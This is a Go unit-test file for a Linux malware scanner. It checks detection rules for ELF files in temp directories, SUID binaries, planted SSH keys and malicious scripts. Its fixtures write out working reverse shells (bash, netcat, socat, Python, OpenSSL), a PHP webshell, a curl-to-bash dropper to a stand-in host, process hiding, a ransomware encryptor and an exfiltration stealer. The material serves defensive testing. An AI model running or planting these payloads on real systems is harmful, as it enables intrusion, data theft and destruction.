package scanner_test

import (
	"os"
	"testing"

	"golang.org/x/sys/unix"

	"aether/internal/config"
	"aether/internal/report"
	"aether/internal/scanner"
)

func TestCheckELFInTempOrDev(t *testing.T) {
	elfHeader := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}
	nonELFHeader := []byte{'#', '!', '/', 'b', 'i', 'n', '/', 's', 'h'}
	cfg := config.NewDefaultConfig()

	// 1. Non-ELF file in /tmp -> should not match
	if m := scanner.CheckELFInTempOrDev("/tmp/script.sh", nonELFHeader, 0755, 0, false, cfg); m != nil {
		t.Errorf("expected nil for non-ELF, got %+v", m)
	}

	// 2. Executable ELF in /tmp without extra signals (owned by root uid=0) -> WARNING (score 55)
	m1 := scanner.CheckELFInTempOrDev("/tmp/test_elf", elfHeader, 0755, 0, false, cfg)
	if m1 == nil || m1.Severity != report.SeverityWarning || m1.Score != 55 {
		t.Errorf("expected WARNING (55) for standard ELF in /tmp, got: %+v", m1)
	}

	// 3. ELF in /tmp with hidden name + executable bit -> Escalated to ALERT (score 85)
	m2 := scanner.CheckELFInTempOrDev("/tmp/.hidden_elf", elfHeader, 0755, 0, false, cfg)
	if m2 == nil || m2.Severity != report.SeverityAlert || m2.Score != 85 {
		t.Errorf("expected ALERT (85) for hidden executable ELF in /tmp, got: %+v", m2)
	}

	// 4. ELF in /tmp with other signal (e.g. IOC hit) -> Escalated to ALERT (score 85)
	m3 := scanner.CheckELFInTempOrDev("/tmp/normal_name", elfHeader, 0644, 0, true, cfg)
	if m3 == nil || m3.Severity != report.SeverityAlert || m3.Score != 85 {
		t.Errorf("expected ALERT (85) for ELF in /tmp with other signal, got: %+v", m3)
	}

	// 5. ELF regular file in /dev -> ALERT (score 85)
	m4 := scanner.CheckELFInTempOrDev("/dev/fake_char", elfHeader, 0755, 0, false, cfg)
	if m4 == nil || m4.Severity != report.SeverityAlert || m4.Score != 85 {
		t.Errorf("expected ALERT (85) for regular ELF file in /dev, got: %+v", m4)
	}

	// 6. Executable ELF in /dev/shm -> WARNING (score 55)
	m5 := scanner.CheckELFInTempOrDev("/dev/shm/miner", elfHeader, 0755, 0, false, cfg)
	if m5 == nil || m5.Severity != report.SeverityWarning || m5.Score != 55 {
		t.Errorf("expected WARNING (55) for ELF in /dev/shm, got: %+v", m5)
	}

	// 7. Non-executable ELF in /tmp owned by current invoking non-root user -> NOTICE (score 25)
	currentUID := uint32(os.Getuid())
	m6 := scanner.CheckELFInTempOrDev("/tmp/cached_lib.so", elfHeader, 0644, currentUID, false, cfg)
	if os.Geteuid() != 0 {
		if m6 == nil || m6.Severity != report.SeverityNotice || m6.Score != 25 {
			t.Errorf("expected NOTICE (25) for non-executable ELF owned by non-root user in /tmp, got: %+v", m6)
		}
	}

	// 8. Non-executable ELF in /tmp owned by current non-root user BUT with IOC signal -> Escalated to ALERT (score 85)
	m7 := scanner.CheckELFInTempOrDev("/tmp/cached_lib.so", elfHeader, 0644, currentUID, true, cfg)
	if m7 == nil || m7.Severity != report.SeverityAlert || m7.Score != 85 {
		t.Errorf("expected ALERT (85) for non-executable ELF with IOC match in /tmp, got: %+v", m7)
	}
}

func TestCheckHiddenExecutableInSystemDirs(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Non-executable hidden file in /usr/bin -> nil
	if m := scanner.CheckHiddenExecutableInSystemDirs("/usr/bin/.hidden", 0644, cfg); m != nil {
		t.Errorf("expected nil for non-executable, got %+v", m)
	}

	// 2. Normal executable in /usr/bin -> nil
	if m := scanner.CheckHiddenExecutableInSystemDirs("/usr/bin/cat", 0755, cfg); m != nil {
		t.Errorf("expected nil for normal binary, got %+v", m)
	}

	// 3. Hidden executable in /usr/bin -> WARNING (score 65)
	m := scanner.CheckHiddenExecutableInSystemDirs("/usr/bin/.stealth", 0755, cfg)
	if m == nil || m.Severity != report.SeverityWarning || m.Score != 65 {
		t.Errorf("expected WARNING (65) for hidden executable in /usr/bin, got: %+v", m)
	}

	// 4. Hidden executable in /home/user -> nil (not system dir)
	if m := scanner.CheckHiddenExecutableInSystemDirs("/home/user/.bashrc", 0755, cfg); m != nil {
		t.Errorf("expected nil for user directory, got %+v", m)
	}
}

func TestCheckSuspiciousSUID(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. SUID in standard path /usr/bin/passwd -> nil
	suidMode := uint32(unix.S_ISUID | 0755)
	if m := scanner.CheckSuspiciousSUID("/usr/bin/passwd", suidMode, cfg); m != nil {
		t.Errorf("expected nil for standard SUID /usr/bin/passwd, got %+v", m)
	}

	// 2. Non-SUID in /tmp -> nil
	if m := scanner.CheckSuspiciousSUID("/tmp/tool", 0755, cfg); m != nil {
		t.Errorf("expected nil for non-SUID file, got %+v", m)
	}

	// 3. SUID executable in /tmp/rootshell -> ALERT (score 85)
	m := scanner.CheckSuspiciousSUID("/tmp/rootshell", suidMode, cfg)
	if m == nil || m.Severity != report.SeverityAlert || m.Score != 85 {
		t.Errorf("expected ALERT (85) for SUID file in /tmp, got: %+v", m)
	}
}

func TestCheckWorldWritableInEtc(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Normal permissions in /etc/hosts (0644) -> nil
	if m := scanner.CheckWorldWritableInEtc("/etc/hosts", 0644, cfg); m != nil {
		t.Errorf("expected nil for 0644 in /etc, got %+v", m)
	}

	// 2. World writable in /tmp (0666) -> nil (not in /etc)
	if m := scanner.CheckWorldWritableInEtc("/tmp/scratch", 0666, cfg); m != nil {
		t.Errorf("expected nil for /tmp, got %+v", m)
	}

	// 3. World writable in /etc/cron.d/job (0666) -> WARNING (score 60)
	m := scanner.CheckWorldWritableInEtc("/etc/cron.d/job", 0666, cfg)
	if m == nil || m.Severity != report.SeverityWarning || m.Score != 60 {
		t.Errorf("expected WARNING (60) for world-writable file in /etc, got: %+v", m)
	}
}

func TestCheckSuspiciousPrivateKeyMaterial(t *testing.T) {
	cfg := config.NewDefaultConfig()

	openSSHKey := []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----\n")
	rsaKey := []byte("-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Y3...\n-----END RSA PRIVATE KEY-----\n")
	plainText := []byte("This is a normal log file with no private key data.\n")

	// 1. Planted OpenSSH key in /usr/lib/.system-cache/id_ed25519 -> WARNING (score 70)
	m1 := scanner.CheckSuspiciousPrivateKeyMaterial("/usr/lib/.system-cache/id_ed25519", openSSHKey, nil, cfg)
	if m1 == nil || m1.Severity != report.SeverityWarning || m1.Score != 70 || m1.Name != "File_Suspicious_Private_Key_Location" {
		t.Errorf("expected File_Suspicious_Private_Key_Location WARNING for /usr/lib/.system-cache/id_ed25519, got: %+v", m1)
	}

	// 2. Planted RSA key in /etc/.hidden/id_rsa -> WARNING (score 70)
	m2 := scanner.CheckSuspiciousPrivateKeyMaterial("/etc/.hidden/id_rsa", rsaKey, nil, cfg)
	if m2 == nil || m2.Severity != report.SeverityWarning || m2.Score != 70 {
		t.Errorf("expected File_Suspicious_Private_Key_Location WARNING for /etc/.hidden/id_rsa, got: %+v", m2)
	}

	// 3. Legitimate host key in /etc/ssh/ssh_host_ed25519_key -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/etc/ssh/ssh_host_ed25519_key", openSSHKey, nil, cfg); m != nil {
		t.Errorf("expected nil for standard /etc/ssh host key, got: %+v", m)
	}

	// 4. Legitimate user key in /root/.ssh/id_ed25519 -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/root/.ssh/id_ed25519", openSSHKey, nil, cfg); m != nil {
		t.Errorf("expected nil for /root/.ssh/id_ed25519, got: %+v", m)
	}

	// 5. Legitimate user key in /home/alice/.ssh/id_rsa -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/home/alice/.ssh/id_rsa", rsaKey, nil, cfg); m != nil {
		t.Errorf("expected nil for /home/alice/.ssh/id_rsa, got: %+v", m)
	}

	// 6. Tiny key file (under 200 bytes) -> evaluated normally
	tinyKey := []byte("-----BEGIN PRIVATE KEY-----\nMC4CAQAwBQYDK2VwBCIEIP...\n-----END PRIVATE KEY-----\n")
	m6 := scanner.CheckSuspiciousPrivateKeyMaterial("/usr/lib/.system-cache/tiny_key", tinyKey, nil, cfg)
	if m6 == nil || m6.Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for tiny key file, got: %+v", m6)
	}

	// 7. Non-key text file in hidden path -> nil
	if m := scanner.CheckSuspiciousPrivateKeyMaterial("/usr/lib/.system-cache/log.txt", plainText, nil, cfg); m != nil {
		t.Errorf("expected nil for non-key file, got: %+v", m)
	}
}

func TestCheckSuspiciousScriptContent(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. User's exact reverse shell payload
	userRevShell := []byte("sh -i >& /dev/tcp/192.168.1.18/4444 0>&1\n")
	m1 := scanner.CheckSuspiciousScriptContent("/home/nick/Music/real.sh", userRevShell, nil, cfg)
	if m1 == nil || m1.Severity != report.SeverityAlert || m1.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for user's real.sh, got: %+v", m1)
	}

	// 2. Standard bash reverse shell
	bashRevShell := []byte("/bin/bash -i >& /dev/tcp/10.0.0.1/9001 0>&1\n")
	m2 := scanner.CheckSuspiciousScriptContent("/tmp/shell.sh", bashRevShell, nil, cfg)
	if m2 == nil || m2.Severity != report.SeverityAlert || m2.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for bash rev shell, got: %+v", m2)
	}

	// 3. Exec fd redirection reverse shell
	execRevShell := []byte("exec 5<>/dev/tcp/10.0.0.1/4242; cat <&5 | while read line; do $line 2>&5 >&5; done\n")
	m3 := scanner.CheckSuspiciousScriptContent("/tmp/backdoor.sh", execRevShell, nil, cfg)
	if m3 == nil || m3.Severity != report.SeverityAlert || m3.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for exec fd reverse shell, got: %+v", m3)
	}

	// 4. Netcat reverse shell with -e
	ncRevShell := []byte("nc -e /bin/bash 192.168.1.1 4444\n")
	m4 := scanner.CheckSuspiciousScriptContent("/tmp/nc.sh", ncRevShell, nil, cfg)
	if m4 == nil || m4.Severity != report.SeverityAlert || m4.Name != "Script_Netcat_Reverse_Shell" {
		t.Errorf("expected Script_Netcat_Reverse_Shell ALERT for nc -e, got: %+v", m4)
	}

	// 5. Socat reverse shell
	socatRevShell := []byte("socat TCP:192.168.1.1:4444 EXEC:/bin/sh\n")
	m5 := scanner.CheckSuspiciousScriptContent("/tmp/socat.sh", socatRevShell, nil, cfg)
	if m5 == nil || m5.Severity != report.SeverityAlert || m5.Name != "Script_Socat_Reverse_Shell" {
		t.Errorf("expected Script_Socat_Reverse_Shell ALERT for socat, got: %+v", m5)
	}

	// 6. Python inline socket reverse shell
	pyRevShell := []byte("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'\n")
	m6 := scanner.CheckSuspiciousScriptContent("/tmp/py.sh", pyRevShell, nil, cfg)
	if m6 == nil || m6.Severity != report.SeverityAlert || m6.Name != "Script_Reverse_Shell_Inline" {
		t.Errorf("expected Script_Reverse_Shell_Inline ALERT for python rev shell, got: %+v", m6)
	}

	// 7. Generic PHP webshell
	phpWebshell := []byte("<?php eval(base64_decode($_POST['c'])); ?>\n")
	m7 := scanner.CheckSuspiciousScriptContent("/var/www/html/shell.php", phpWebshell, nil, cfg)
	if m7 == nil || m7.Severity != report.SeverityAlert || m7.Name != "Webshell_PHP_Generic_Backdoor" {
		t.Errorf("expected Webshell_PHP_Generic_Backdoor ALERT for PHP webshell, got: %+v", m7)
	}

	// 8. Download and execute dropper
	dropper := []byte("curl -sSL https://evil.example.com/payload.sh | bash\n")
	m8 := scanner.CheckSuspiciousScriptContent("/tmp/install.sh", dropper, nil, cfg)
	if m8 == nil || m8.Severity != report.SeverityWarning || m8.Name != "Script_Download_And_Execute" {
		t.Errorf("expected Script_Download_And_Execute WARNING for dropper, got: %+v", m8)
	}

	// 9. Parameterized reverse shell with variables/quotes (kraken3 pattern)
	paramRevShell := []byte("exec 5<>/dev/tcp/\"${IP}\"/\"${PORT}\"; cat <&5 | while read line; do $line 2>&5 >&5; done\n")
	m9 := scanner.CheckSuspiciousScriptContent("/home/nick/Music/implant.sh", paramRevShell, nil, cfg)
	if m9 == nil || m9.Severity != report.SeverityAlert || m9.Name != "Script_Reverse_Shell_Interactive" {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT for parameterized rev shell, got: %+v", m9)
	}

	// 10. OpenSSL encrypted reverse shell (kraken3 pattern)
	opensslRevShell := []byte("openssl s_client -quiet -connect \"${IP}:${PORT}\" < /tmp/.gs_pipe_$$ | /bin/bash > /tmp/.gs_pipe_$$ 2>&1\n")
	m10 := scanner.CheckSuspiciousScriptContent("/tmp/openssl_shell.sh", opensslRevShell, nil, cfg)
	if m10 == nil || m10.Severity != report.SeverityAlert || m10.Name != "Script_OpenSSL_Reverse_Shell" {
		t.Errorf("expected Script_OpenSSL_Reverse_Shell ALERT for openssl s_client pipe, got: %+v", m10)
	}

	// 11. Procfs tmpfs hiding (kraken3 stealth pattern)
	procHiding := []byte("mount -t tmpfs -o size=1M tmpfs \"/proc/${pid}\"\n")
	m11 := scanner.CheckSuspiciousScriptContent("/tmp/hide_proc.sh", procHiding, nil, cfg)
	if m11 == nil || m11.Severity != report.SeverityAlert || m11.Name != "Script_Process_Hiding_Procfs" {
		t.Errorf("expected Script_Process_Hiding_Procfs ALERT for procfs tmpfs hiding, got: %+v", m11)
	}

	// 12. Red-team persistence framework signature (kraken3 banner)
	ghostShell := []byte("#!/bin/bash\n# GHOST-SHELL v4.0 — KALI-MASTER PERSISTENCE FRAMEWORK\n# TIER-1 RED TEAM IMPLANT\n")
	m12 := scanner.CheckSuspiciousScriptContent("/home/nick/Music/ghost.sh", ghostShell, nil, cfg)
	if m12 == nil || m12.Severity != report.SeverityAlert || m12.Name != "Script_RedTeam_Persistence_Framework" {
		t.Errorf("expected Script_RedTeam_Persistence_Framework ALERT for ghostshell banner, got: %+v", m12)
	}

	// 13. Benign script
	benignScript := []byte("#!/bin/bash\necho 'Hello World'\nls -la /var/log\n")
	m13 := scanner.CheckSuspiciousScriptContent("/home/nick/script.sh", benignScript, nil, cfg)
	if m13 != nil {
		t.Errorf("expected nil for benign script, got: %+v", m13)
	}

	// 14. Python ransomware encryptor / locker
	ransomScript := []byte("from cryptography.fernet import Fernet\nimport os\nkey = Fernet.generate_key()\nf = Fernet(key)\nfor root, dirs, files in os.walk('/home/user'):\n    for file in files:\n        path = os.path.join(root, file)\n        with open(path, 'rb') as f_in:\n            enc = f.encrypt(f_in.read())\n        os.remove(path)\n")
	m14 := scanner.CheckSuspiciousScriptContent("/tmp/ransom.py", ransomScript, nil, cfg)
	if m14 == nil || m14.Severity != report.SeverityAlert || m14.Name != "Script_Python_Ransomware_Encryptor" {
		t.Errorf("expected Script_Python_Ransomware_Encryptor ALERT for ransomware script, got: %+v", m14)
	}

	// 15. Python data exfiltration stealer
	exfilScript := []byte("import socket, os, zlib, json\ns = socket.create_connection(('10.96.88.135', 4444))\nTARGET_DIR = '/home/user/docs'\nfor root, dirs, files in os.walk(TARGET_DIR):\n    data = zlib.compress(json.dumps(files).encode())\n    s.sendall(data)\n")
	m15 := scanner.CheckSuspiciousScriptContent("/tmp/exfil.py", exfilScript, nil, cfg)
	if m15 == nil || m15.Severity != report.SeverityAlert || m15.Name != "Script_Data_Exfiltration_Stealer" {
		t.Errorf("expected Script_Data_Exfiltration_Stealer ALERT for exfil script, got: %+v", m15)
	}

	// 17. Benign Python package metadata containing curl | bash example
	metaData := []byte("Metadata-Version: 2.1\nName: elasticsearch\nDescription: Install via curl -sSL https://elastic.co/install.sh | bash\n")
	m17 := scanner.CheckSuspiciousScriptContent("/usr/lib/python3/dist-packages/elasticsearch-9.5.0.dist-info/METADATA", metaData, nil, cfg)
	if m17 != nil {
		t.Errorf("expected nil for benign Python metadata documentation, got: %+v", m17)
	}

	// 18. Benign unit test fixture containing mock server
	testMock := []byte("import unittest, socket\nclass TestServer(unittest.TestCase):\n    def test_mock(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.bind(('127.0.0.1', 0))\n        s.listen(1)\n")
	m18 := scanner.CheckSuspiciousScriptContent("/usr/lib/python3/dist-packages/twisted/test/test_fdset.py", testMock, nil, cfg)
	if m18 != nil {
		t.Errorf("expected nil for benign package unit test fixture, got: %+v", m18)
	}
}

type mockTestPkgDB struct {
	owned map[string]string
}

func (m *mockTestPkgDB) Owner(path string) (string, bool) {
	pkg, ok := m.owned[path]
	return pkg, ok
}

func (m *mockTestPkgDB) IsAvailable() bool {
	return true
}

func (m *mockTestPkgDB) StatusNote() string {
	return "mock test db"
}

func (m *mockTestPkgDB) PackageCount() int {
	return len(m.owned)
}

func TestCheckSuspiciousScriptContent_PackageOwnedTrojanAndBenign(t *testing.T) {
	cfg := config.NewDefaultConfig()

	trojanPath := "/usr/lib/python3/dist-packages/python3-distro-util/trojan_package_file.py"
	benignPkgPath := "/usr/lib/python3/dist-packages/requests/api.py"
	benignShellPath := "/usr/bin/update-ca-certificates"

	mockDB := &mockTestPkgDB{
		owned: map[string]string{
			trojanPath:      "python3-distro-util",
			benignPkgPath:   "python3-requests",
			benignShellPath: "ca-certificates",
		},
	}

	// 1. Direct malware injected into verified package file -> MUST detect as ALERT and evaluate to MALICIOUS
	trojanContent := []byte("#!/usr/bin/env python3\nimport os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n")
	mTrojan := scanner.CheckSuspiciousScriptContent(trojanPath, trojanContent, mockDB, cfg)
	if mTrojan == nil {
		t.Fatalf("expected heuristic match for trojanized package file, got nil")
	}
	if mTrojan.Name != "Script_Reverse_Shell_Interactive" || mTrojan.Severity != report.SeverityAlert {
		t.Errorf("expected Script_Reverse_Shell_Interactive ALERT, got: %+v", mTrojan)
	}

	finding := &report.Finding{
		Path:       trojanPath,
		RuleName:   mTrojan.Name,
		Reason:     mTrojan.Reason,
		Severity:   mTrojan.Severity,
		Confidence: report.ConfidenceHigh,
	}
	verdict := report.DetermineVerdict(finding, mockDB, true, false, false, nil)
	if verdict != report.VerdictMalicious {
		t.Errorf("expected VerdictMalicious for trojanized package file, got: %s", verdict)
	}
	if finding.Severity != report.SeverityAlert {
		t.Errorf("expected SeverityAlert, got: %s", finding.Severity)
	}
	if finding.Confidence != report.ConfidenceHigh {
		t.Errorf("expected ConfidenceHigh, got: %s", finding.Confidence)
	}
	if finding.EvidenceRecord == nil || finding.EvidenceRecord.PackageStatus != "modified_package" {
		t.Errorf("expected PackageStatus 'modified_package', got: %+v", finding.EvidenceRecord)
	}

	// 2. Legitimate package-owned Python library -> MUST produce nil (clean)
	benignPkgContent := []byte("def request(method, url, **kwargs):\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n")
	mBenign := scanner.CheckSuspiciousScriptContent(benignPkgPath, benignPkgContent, mockDB, cfg)
	if mBenign != nil {
		t.Errorf("expected nil for benign package code, got: %+v", mBenign)
	}

	// 3. Legitimate package-owned system administrative shell script -> MUST produce nil (clean)
	benignShellContent := []byte("#!/bin/sh\nset -e\necho 'Updating certificates in /etc/ssl/certs...'\n")
	mShell := scanner.CheckSuspiciousScriptContent(benignShellPath, benignShellContent, mockDB, cfg)
	if mShell != nil {
		t.Errorf("expected nil for benign package admin script, got: %+v", mShell)
	}
}



